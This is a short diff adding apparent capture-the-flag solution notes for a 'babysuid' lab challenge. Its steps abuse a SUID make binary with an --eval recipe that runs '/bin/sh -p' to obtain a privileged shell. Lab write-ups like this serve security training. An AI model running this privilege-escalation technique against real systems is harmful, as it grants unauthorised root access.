@@ -1,0 +1,4 @@
+1 Connect to terminal
+2 Read instructions : /challenge/babysuid
+3 Set varibale : COMMAND='/bin/sh -p'
+4 /challenge/bin/make -s --eval=$'x:\n\t-'"$COMMAND"
